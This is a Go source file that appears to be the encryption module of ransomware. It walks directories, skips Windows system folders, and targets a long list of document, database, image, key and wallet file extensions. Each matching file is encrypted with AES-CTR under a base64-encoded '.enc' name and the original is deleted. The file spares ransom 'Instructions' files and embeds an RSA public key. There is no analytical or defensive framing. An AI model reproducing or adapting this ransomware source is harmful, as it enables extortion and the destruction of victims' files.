package aes

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"../base64"
)

var plaintext []byte

var exts = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
	".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
	".djvu", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
	".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp", ".brd",
	".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf",
	".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB",
	".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm",
	".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
	".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi",
	".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk",
	".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp",
	".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV",
	".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt",
	".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
}
var badfolders = []string{"tmp", "winnt", "Application Data", "AppData",
	"Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin",
	"System Volume Information", "Boot", "Windows",
}

var block cipher.Block
var iv [aes.BlockSize]byte
var stream cipher.Stream
var TargetFileName string

var pubKey = `-----BEGIN PUBLIC KEY-----
MIGgMA0GCSqGSIb3DQEBAQUAA4GOADCBigKBgQDQIHdNPClJAZVUb9AiPk/A7dAP
V2+6HLiw1pZyEZel+Pr0Z53uakh0BD1mNzZzfCr3AyCGqhxveyg5SItX8Ce8DQhN
Kl9TBjPjNjAKb4XF2kKZepMjOM2sgLsdAotYAZcUiczssmgxkHaUpoYtTs6YJadE
ypklH1uu6oM6xiVK/wIEDhO6Xw==
-----END PUBLIC KEY-----`

// EncryptDocumets Walks documments in a path and encript or decrypts them.
func EncryptDocumets(path string, mode bool) {
	if mode {
		//Encrypt
		filepath.Walk(path, visit)
	} else {
		//Decrpy
		filepath.Walk(path, visitD)
	}

}

// InitializeBlock Sets up the encription with a key
func InitializeBlock(key []byte, tfn string) {
	block, _ = aes.NewCipher(key)
	stream = cipher.NewCTR(block, iv[:])
	TargetFileName = tfn
}

func visit(path string, f os.FileInfo, err error) error {
	for _, folder := range badfolders {
		if strings.Contains(path, folder) {
			return nil
		}
	}
	if !strings.Contains(path, ".enc") && !strings.Contains(path, "Instructions") && !strings.Contains(path, TargetFileName) {
		for _, ext := range exts {
			if strings.Contains(path, ext) {
				StreamEncrypter(path)
				return nil
			}

		}
	}
	return nil
}
func visitD(path string, f os.FileInfo, err error) error {
	if strings.Contains(path, ".enc") && !f.IsDir() {
		StreamDecrypter(path)
	}
	return nil
}

// StreamDecrypter decryps a file given its filepath
func StreamDecrypter(path string) {
	inFile, err := os.Open(path)
	if err != nil {
		//Couldn't open file, maybe a folder
		return
	}
	//get the path for the output
	opPath := strings.Trim(path, ".enc")
	// Divide filepath
	filenameArr := strings.Split(opPath, string(os.PathSeparator))
	//Get base64 encoded filename
	filename := filenameArr[len(filenameArr)-1]

	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
	outFile, err := os.OpenFile(path2+string(os.PathSeparator)+base64.Base64Decode(filename), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return
	}
	defer outFile.Close()
	reader := &cipher.StreamReader{S: stream, R: inFile}
	io.Copy(outFile, reader)
	inFile.Close()
	os.Remove(path)
}

// StreamEncrypter encrypts a file given its filepatth
func StreamEncrypter(path string) {

	inFile, err := os.Open(path)
	if err != nil {
		return
	}

	filenameArr := strings.Split(path, string(os.PathSeparator))
	filename := filenameArr[len(filenameArr)-1]
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))

	fmt.Println("")
	outFile, err := os.OpenFile(path2+string(os.PathSeparator)+base64.Base64Encode(filename)+".enc", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0666)
	if err != nil {
		return
	}

	writer := &cipher.StreamWriter{S: stream, W: outFile}
	io.Copy(writer, inFile)
	inFile.Close()
	outFile.Close()
	os.Remove(path)
}
